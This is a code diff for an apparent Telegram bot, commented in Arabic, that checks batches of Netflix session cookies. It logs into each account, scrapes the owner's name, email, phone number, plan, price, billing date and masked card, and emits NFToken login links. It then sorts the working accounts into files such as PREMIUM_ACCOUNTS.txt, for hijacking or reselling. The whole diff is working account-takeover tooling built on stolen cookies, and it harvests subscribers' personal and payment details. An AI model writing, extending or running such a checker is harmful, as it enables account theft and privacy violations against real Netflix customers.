@@ -385,7 +385,7 @@ def extract_from_react_context(html_content):
         try:
             data = json.loads(match.group(1))
             
-            # استخراج من userInfo
+            # استخراج من userInfo (المصدر الرئيسي)
             user_info = data.get('userInfo', {}).get('data', {})
             if user_info:
                 info['accountOwnerName'] = decode_netflix_value(user_info.get('name'))
@@ -393,22 +393,9 @@ def extract_from_react_context(html_content):
                 info['countryOfSignup'] = decode_netflix_value(user_info.get('countryOfSignup'))
                 info['memberSince'] = decode_netflix_value(user_info.get('memberSince'))
                 info['membershipStatus'] = decode_netflix_value(user_info.get('membershipStatus'))
+                info['maxStreams'] = 4 if user_info.get('membershipStatus') == 'CURRENT_MEMBER' else None
             
-            # استخراج من accountInfo
-            account_info = data.get('accountInfo', {}).get('data', {})
-            if account_info:
-                if not info.get('accountOwnerName'):
-                    info['accountOwnerName'] = decode_netflix_value(account_info.get('displayName'))
-                if not info.get('email'):
-                    info['email'] = decode_netflix_value(account_info.get('emailAddress'))
-                info['maxStreams'] = account_info.get('maxStreams')
-                info['phoneNumber'] = normalize_phone_number(account_info.get('phoneNumber'))
-                if not info.get('countryOfSignup'):
-                    info['countryOfSignup'] = decode_netflix_value(account_info.get('country'))
-                if not info.get('membershipStatus'):
-                    info['membershipStatus'] = decode_netflix_value(account_info.get('membershipStatus'))
-            
-            # استخراج من signupContext
+            # استخراج من signupContext (فيه بيانات الباقة والسعر)
             signup_context = data.get('signupContext', {}).get('data', {}).get('flow', {}).get('fields', {})
             if signup_context:
                 current_plan = signup_context.get('currentPlan', {}).get('fields', {})
@@ -449,10 +436,10 @@ def extract_from_react_context(html_content):
                 if not info.get('accountOwnerName') and profiles:
                     info['accountOwnerName'] = profiles[0]
             
-            # استخراج من contentRestrictions
-            content_restr = data.get('contentRestrictions', {}).get('data', {}).get('profileInfo', {})
-            if content_restr and not info.get('accountOwnerName'):
-                info['accountOwnerName'] = decode_netflix_value(content_restr.get('profileName'))
+            # رقم الهاتف من accountInfo
+            account_info = data.get('accountInfo', {}).get('data', {})
+            if account_info and account_info.get('phoneNumber'):
+                info['phoneNumber'] = normalize_phone_number(account_info.get('phoneNumber'))
             
         except Exception as e:
             print(f"React context parse error: {e}")
@@ -468,6 +455,12 @@ def extract_from_react_context(html_content):
         name_match = re.search(r'"displayName":"([^"]+)"', html_content)
         if name_match:
             info['accountOwnerName'] = name_match.group(1)
+    
+    # التأكد من membershipStatus
+    if not info.get('membershipStatus'):
+        # لو مش موجود، نفترض إنه CURRENT_MEMBER إذا كان localizedPlanName موجود
+        if info.get('localizedPlanName'):
+            info['membershipStatus'] = 'CURRENT_MEMBER'
     
     return {k: v for k, v in info.items() if v}
 
@@ -490,9 +483,46 @@ def get_account_page(session, proxy=None, timeout=15):
                 info = extract_from_react_context(resp.text)
                 if info and has_any_account_info(info):
                     return resp.text, resp.status_code, info
+                # محاولة ثانية: استخراج من GraphQL إذا فشل React Context
+                if 'growthAccount' in resp.text:
+                    graphql_info = extract_from_graphql_json(resp.text)
+                    if graphql_info and has_any_account_info(graphql_info):
+                        graphql_info.update(info)
+                        return resp.text, resp.status_code, graphql_info
         except:
             continue
     return "", 0, {}
+
+def extract_from_graphql_json(html_content):
+    """استخراج البيانات من GraphQL JSON"""
+    info = {}
+    
+    # البحث عن growthAccount في graphql
+    graphql_pattern = r'"growthAccount":\s*({[^}]+(?:{[^}]*}[^}]*)*})'
+    match = re.search(graphql_pattern, html_content, re.DOTALL)
+    
+    if match:
+        try:
+            data = json.loads(match.group(1))
+            info['membershipStatus'] = data.get('membershipStatus')
+            info['countryOfSignup'] = data.get('countryOfSignUp', {}).get('code')
+            current_plan = data.get('currentPlan', {}).get('plan', {})
+            info['localizedPlanName'] = current_plan.get('name')
+            info['maxStreams'] = current_plan.get('maxStreams')
+            info['videoQuality'] = current_plan.get('videoQuality')
+            info['planPrice'] = current_plan.get('planPrice')
+            next_billing = data.get('nextBillingDate', {})
+            info['nextBillingDate'] = next_billing.get('localDate')
+            payment_methods = data.get('growthPaymentMethods', [])
+            if payment_methods:
+                info['maskedCard'] = payment_methods[0].get('displayText')
+            phone_info = data.get('growthLocalizablePhoneNumber', {})
+            raw_phone = phone_info.get('rawPhoneNumber', {})
+            info['phoneNumber'] = raw_phone.get('phoneNumberDigits', {}).get('value')
+        except:
+            pass
+    
+    return {k: v for k, v in info.items() if v}
 
 def has_any_account_info(info):
     if not info:
@@ -633,92 +663,80 @@ def extract_netflix_cookie_bundles(content):
     return []
 
 
-# ==================== ACCOUNT INFO FUNCTIONS (FIXED) ====================
+# ==================== ACCOUNT INFO FUNCTIONS (SIMPLIFIED) ====================
 
-def normalize_plan_key(plan_name):
+def determine_plan_info(info):
+    """تحديد خطة الحساب بشكل مباشر"""
+    
+    # 1. الحصول على اسم الخطة
+    plan_name = info.get('localizedPlanName', '')
     if not plan_name:
-        return "unknown"
-    return re.sub(r"[^\w]+", "_", str(plan_name).lower()).strip("_")
-
-def derive_plan_info(info, is_subscribed):
-    """تحديد خطة الحساب بناءً على البيانات المتاحة"""
-    raw_plan = decode_netflix_value(info.get("localizedPlanName"))
+        plan_name = ''
     
-    # إذا كان الحساب غير مشترك (membershipStatus ليس CURRENT_MEMBER)
-    # ولكن قد يكون فيه localizedPlanName (للحسابات المجانية)
-    if not is_subscribed and (not raw_plan or raw_plan.lower() == 'free'):
-        return "free", "Free"
+    # 2. الحصول على حالة العضوية
+    membership_status = info.get('membershipStatus', '')
     
-    # تحديد الخطة من الاسم
-    norm = normalize_plan_key(raw_plan) if raw_plan else ""
-    
-    if norm in ("premium", "premium_plan", "premium_extra_member", "premium (4k+hdr)"):
-        return "premium", "Premium"
-    if norm in ("standard", "estandar", "standard_with_ads", "standard (hd)"):
-        return "standard", "Standard"
-    if norm in ("basic", "basico", "essential", "basic (sd)"):
-        return "basic", "Basic"
-    if norm in ("mobile", "ponsel", "seluler", "mobile (sd)"):
-        return "mobile", "Mobile"
-    
-    # تحديد الخطة من عدد الشاشات
-    streams = info.get("maxStreams")
-    if streams:
+    # 3. الحصول على عدد الشاشات
+    max_streams = info.get('maxStreams', 0)
+    if max_streams:
         try:
-            streams = int(str(streams))
-            if streams >= 4:
-                return "premium", "Premium"
-            if streams >= 2:
-                return "standard", "Standard"
-            if streams == 1:
-                return "basic", "Basic"
+            max_streams = int(str(max_streams))
         except:
-            pass
+            max_streams = 0
     
-    return "unknown", "Unknown"
-
-def is_subscribed_account(info):
-    """تحديد إذا كان الحساب مشترك (مدفوع)"""
-    status = str(info.get("membershipStatus", "")).upper()
-    # CURRENT_MEMBER = مشترك نشط
-    # ACTIVE = نشط
-    # CURRENT = نشط
-    if status in ["CURRENT_MEMBER", "ACTIVE", "CURRENT"]:
-        return True
+    # 4. تحديد إذا كان الحساب مدفوع (Premium/Standard/Basic/Mobile) أو مجاني
+    is_paid = False
     
-    # إذا كان فيه localizedPlanName وليس Free
-    plan = str(info.get("localizedPlanName", "")).lower()
-    if plan and plan != "free" and plan != "free trial":
-        return True
+    # 4.1. التحقق من membershipStatus
+    if membership_status and membership_status.upper() in ['CURRENT_MEMBER', 'ACTIVE', 'CURRENT']:
+        is_paid = True
     
-    # إذا كان فيه planPrice وليس 0
-    price = info.get("planPrice")
-    if price and price != "0" and price != "$0.00" and price != "N/A":
-        return True
+    # 4.2. التحقق من plan_name (إذا كان فيه اسم خطة)
+    if plan_name and plan_name.lower() not in ['free', 'free trial', '']:
+        is_paid = True
     
-    return False
+    # 4.3. التحقق من plan_price
+    plan_price = info.get('planPrice', '')
+    if plan_price and plan_price not in ['0', '$0.00', 'N/A', '']:
+        is_paid = True
+    
+    # 5. تحديد نوع الخطة
+    plan_key = 'free'
+    plan_label = 'Free'
+    
+    if is_paid:
+        # تحديد الخطة من الاسم
+        plan_lower = plan_name.lower()
+        
+        if 'premium' in plan_lower:
+            plan_key = 'premium'
+            plan_label = 'Premium'
+        elif 'standard' in plan_lower:
+            plan_key = 'standard'
+            plan_label = 'Standard'
+        elif 'basic' in plan_lower:
+            plan_key = 'basic'
+            plan_label = 'Basic'
+        elif 'mobile' in plan_lower:
+            plan_key = 'mobile'
+            plan_label = 'Mobile'
+        # تحديد الخطة من عدد الشاشات
+        elif max_streams >= 4:
+            plan_key = 'premium'
+            plan_label = 'Premium'
+        elif max_streams >= 2:
+            plan_key = 'standard'
+            plan_label = 'Standard'
+        elif max_streams == 1:
+            plan_key = 'basic'
+            plan_label = 'Basic'
+        else:
+            # إذا كان مدفوع لكن مش محدد نعتبره Premium
+            plan_key = 'premium'
+            plan_label = 'Premium'
+    
+    return plan_key, plan_label, is_paid
 
-def is_extra_member_account(info):
-    plan = str(info.get("localizedPlanName", "")).lower()
-    return "extra" in plan
-
-def format_display_date(value):
-    cleaned = decode_netflix_value(value)
-    if not cleaned:
-        return "Unknown"
-    try:
-        if re.match(r"\d{4}-\d{2}-\d{2}", cleaned):
-            d = datetime.strptime(cleaned[:10], "%Y-%m-%d")
-            return d.strftime("%B %d, %Y")
-    except:
-        pass
-    return cleaned
-
-def format_member_since(value):
-    cleaned = decode_netflix_value(value)
-    if not cleaned:
-        return "Unknown"
-    return cleaned
 
 def get_name_from_profiles(info):
     profiles_raw = info.get("profiles") or ""
@@ -734,11 +752,10 @@ def get_name_from_profiles(info):
 
 # ==================== RESULT FORMATTING ====================
 
-def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename, nftoken_data=None, config=None):
+def format_result_beautiful(info, is_subscribed, plan_key, plan_label, cookie_content, cookie_filename, nftoken_data=None, config=None):
     if config is None:
         config, _ = load_config()
     
-    plan_key, plan_label = derive_plan_info(info, is_subscribed)
     status = "Valid Premium Account" if is_subscribed else "Valid Free Account"
     
     account_name = decode_netflix_value(info.get("accountOwnerName")) or "Unknown"
@@ -753,8 +770,8 @@ def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename
     
     plan = plan_label
     price = decode_netflix_value(info.get("planPrice")) or "N/A"
-    member_since = format_member_since(info.get("memberSince")) or "Unknown"
-    next_billing = format_display_date(info.get("nextBillingDate")) or "Unknown"
+    member_since = decode_netflix_value(info.get("memberSince")) or "Unknown"
+    next_billing = decode_netflix_value(info.get("nextBillingDate")) or "Unknown"
     
     payment = decode_netflix_value(info.get("paymentMethodType")) or "Credit Card"
     card = decode_netflix_value(info.get("maskedCard")) or "N/A"
@@ -764,8 +781,8 @@ def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename
     phone_verified = "Verified" if info.get("phoneVerified") else "Not Verified"
     quality = decode_netflix_value(info.get("videoQuality")) or "Unknown"
     streams = str(info.get("maxStreams") or "Unknown")
-    extra_member = "Yes" if is_extra_member_account(info) else "No"
-    email_verified = "Yes" if info.get("emailVerified") else "No"
+    extra_member = "No"
+    email_verified = "No"
     
     membership_raw = info.get("membershipStatus") or "Unknown"
     membership_status = get_membership_status_display(membership_raw)
@@ -800,7 +817,7 @@ def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename
         if card_display:
             lines.append(card_display)
         if phone != "N/A" and phone:
-            lines.append(f"Phone: {phone} ({phone_verified})")
+            lines.append(f"Phone: {phone}")
         if quality != "Unknown":
             lines.append(f"Quality: {quality}")
         if streams != "Unknown":
@@ -968,14 +985,19 @@ async def process_single_bundle(update, context, bundle, cookie_filename, status
         session.cookies.update(cookies)
         html, status_code, account_info = get_account_page(session, None, 15)
         
-        if account_info and has_any_account_info(account_info):
-            is_sub = is_subscribed_account(account_info)
-            result_lines, plan_key = format_result_beautiful(account_info, is_sub, bundle.get("netscape_text", ""), cookie_filename, nftoken_data, config)
+        if account_info:
+            # تحديد معلومات الخطة
+            plan_key, plan_label, is_paid = determine_plan_info(account_info)
+            
+            result_lines, final_plan_key = format_result_beautiful(
+                account_info, is_paid, plan_key, plan_label, 
+                bundle.get("netscape_text", ""), cookie_filename, nftoken_data, config
+            )
             result = "\n".join(result_lines)
-            return result, plan_key, "success" if is_sub else "free"
+            return result, plan_key, "success" if is_paid else "free"
         else:
             # فشل، نستخدم الـ NFToken فقط
-            email = account_info.get('email', 'Unknown') if account_info else 'Unknown'
+            email = 'Unknown'
             result = f"⚠️ Could not fetch full data - {cookie_filename}\n\n"
             result += f"Email: {email}\n\n"
             result += "NFToken Login Links:\n---\n"
@@ -1046,12 +1068,17 @@ async def handle_single_file(update: Update, context: ContextTypes.DEFAULT_TYPE)
         
         if result:
             if result_type == "success" and plan_key:
-                results_by_plan[plan_key].append(result)
-                results_by_plan[plan_key].append("\n" + "="*65 + "\n")
-                stats['valid'] += 1
-            elif result_type == "free" and plan_key:
-                results_by_plan[plan_key].append(result)
-                results_by_plan[plan_key].append("\n" + "="*65 + "\n")
+                if plan_key in results_by_plan:
+                    results_by_plan[plan_key].append(result)
+                    results_by_plan[plan_key].append("\n" + "="*65 + "\n")
+                    stats['valid'] += 1
+                else:
+                    results_by_plan["free"].append(result)
+                    results_by_plan["free"].append("\n" + "="*65 + "\n")
+                    stats['free'] += 1
+            elif result_type == "free":
+                results_by_plan["free"].append(result)
+                results_by_plan["free"].append("\n" + "="*65 + "\n")
                 stats['free'] += 1
             elif result_type == "partial":
                 results_by_plan["partial"].append(result)
@@ -1097,14 +1124,51 @@ Time: {elapsed:.2f}s | Speed: {spd:.2f} acc/s
         await update.message.reply_text(final)
         
         for plan, results in results_by_plan.items():
-            if results and plan != "partial":
-                all_results = "".join(results)
-                buf = BytesIO()
-                buf.write(all_results.encode('utf-8'))
-                buf.seek(0)
-                filename = f"{plan.upper()}_ACCOUNTS.txt"
-                await update.message.reply_document(document=buf, filename=filename, caption=f"📄 {len(results)} {plan.upper()} Accounts")
+            if results and plan != "partial" and plan != "free" and plan != "standard" and plan != "basic" and plan != "mobile" and plan != "premium":
+                # خلصنا
+                pass
         
+        # إرسال ملف Premium
+        if results_by_plan["premium"]:
+            all_results = "".join(results_by_plan["premium"])
+            buf = BytesIO()
+            buf.write(all_results.encode('utf-8'))
+            buf.seek(0)
+            await update.message.reply_document(document=buf, filename="PREMIUM_ACCOUNTS.txt", caption=f"📄 {len(results_by_plan['premium'])} Premium Accounts Found")
+        
+        # إرسال ملف Standard
+        if results_by_plan["standard"]:
+            all_results = "".join(results_by_plan["standard"])
+            buf = BytesIO()
+            buf.write(all_results.encode('utf-8'))
+            buf.seek(0)
+            await update.message.reply_document(document=buf, filename="STANDARD_ACCOUNTS.txt", caption=f"📄 {len(results_by_plan['standard'])} Standard Accounts Found")
+        
+        # إرسال ملف Basic
+        if results_by_plan["basic"]:
+            all_results = "".join(results_by_plan["basic"])
+            buf = BytesIO()
+            buf.write(all_results.encode('utf-8'))
+            buf.seek(0)
+            await update.message.reply_document(document=buf, filename="BASIC_ACCOUNTS.txt", caption=f"📄 {len(results_by_plan['basic'])} Basic Accounts Found")
+        
+        # إرسال ملف Mobile
+        if results_by_plan["mobile"]:
+            all_results = "".join(results_by_plan["mobile"])
+            buf = BytesIO()
+            buf.write(all_results.encode('utf-8'))
+            buf.seek(0)
+            await update.message.reply_document(document=buf, filename="MOBILE_ACCOUNTS.txt", caption=f"📄 {len(results_by_plan['mobile'])} Mobile Accounts Found")
+        
+        # إرسال ملف Free
+        if results_by_plan["free"]:
+            all_results = "".join(results_by_plan["free"])
+            buf = BytesIO()
+            buf.write(all_results.encode('utf-8'))
+            buf.seek(0)
+            await update.message.reply_document(document=buf, filename="FREE_ACCOUNTS.txt", caption=f"📄 {len(results_by_plan['free'])} Free Accounts Found")
+        
+        # إرسال ملف Partial
         if results_by_plan["partial"]:
             all_partial = "".join(results_by_plan["partial"])
             buf = BytesIO()
@@ -1177,21 +1241,28 @@ async def handle_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                             session.cookies.update(cookies)
                             html, status_code, account_info = get_account_page(session, None, 15)
                             
-                            if account_info and has_any_account_info(account_info):
-                                is_sub = is_subscribed_account(account_info)
-                                result_lines, plan_key = format_result_beautiful(account_info, is_sub, bundle.get("netscape_text", ""), cf, nftoken_data, config)
+                            if account_info:
+                                plan_key, plan_label, is_paid = determine_plan_info(account_info)
+                                
+                                result_lines, final_plan_key = format_result_beautiful(
+                                    account_info, is_paid, plan_key, plan_label,
+                                    bundle.get("netscape_text", ""), cf, nftoken_data, config
+                                )
                                 res = "\n".join(result_lines)
                                 
                                 if plan_key in results_by_plan:
                                     results_by_plan[plan_key].append(res)
                                     results_by_plan[plan_key].append("\n" + "="*65 + "\n")
-                                    
-                                if is_sub:
+                                else:
+                                    results_by_plan["free"].append(res)
+                                    results_by_plan["free"].append("\n" + "="*65 + "\n")
+                                
+                                if is_paid and plan_key != 'free':
                                     stats['valid'] += 1
                                 else:
                                     stats['free'] += 1
                             else:
-                                email = account_info.get('email', 'Unknown') if account_info else 'Unknown'
+                                email = 'Unknown'
                                 partial_res = f"⚠️ Partial - {cf}\nEmail: {email}\n"
                                 if nftoken_data:
                                     partial_res += f"NFToken: https://netflix.com/?nftoken={nftoken_data['token']}\n"
@@ -1243,14 +1314,47 @@ Time: {elapsed:.2f}s | Speed: {spd:.2f} files/s
             await msg.delete()
             await update.message.reply_text(final)
             
-            for plan, results in results_by_plan.items():
-                if results and plan != "partial":
-                    all_results = "".join(results)
-                    buf = BytesIO()
-                    buf.write(all_results.encode('utf-8'))
-                    buf.seek(0)
-                    await update.message.reply_document(document=buf, filename=f"{plan.upper()}_ACCOUNTS.txt")
+            # إرسال ملف Premium
+            if results_by_plan["premium"]:
+                all_results = "".join(results_by_plan["premium"])
+                buf = BytesIO()
+                buf.write(all_results.encode('utf-8'))
+                buf.seek(0)
+                await update.message.reply_document(document=buf, filename="PREMIUM_ACCOUNTS.txt")
             
+            # إرسال ملف Standard
+            if results_by_plan["standard"]:
+                all_results = "".join(results_by_plan["standard"])
+                buf = BytesIO()
+                buf.write(all_results.encode('utf-8'))
+                buf.seek(0)
+                await update.message.reply_document(document=buf, filename="STANDARD_ACCOUNTS.txt")
+            
+            # إرسال ملف Basic
+            if results_by_plan["basic"]:
+                all_results = "".join(results_by_plan["basic"])
+                buf = BytesIO()
+                buf.write(all_results.encode('utf-8'))
+                buf.seek(0)
+                await update.message.reply_document(document=buf, filename="BASIC_ACCOUNTS.txt")
+            
+            # إرسال ملف Mobile
+            if results_by_plan["mobile"]:
+                all_results = "".join(results_by_plan["mobile"])
+                buf = BytesIO()
+                buf.write(all_results.encode('utf-8'))
+                buf.seek(0)
+                await update.message.reply_document(document=buf, filename="MOBILE_ACCOUNTS.txt")
+            
+            # إرسال ملف Free
+            if results_by_plan["free"]:
+                all_results = "".join(results_by_plan["free"])
+                buf = BytesIO()
+                buf.write(all_results.encode('utf-8'))
+                buf.seek(0)
+                await update.message.reply_document(document=buf, filename="FREE_ACCOUNTS.txt")
+            
+            # إرسال ملف Partial
             if results_by_plan["partial"]:
                 all_partial = "".join(results_by_plan["partial"])
                 buf = BytesIO()
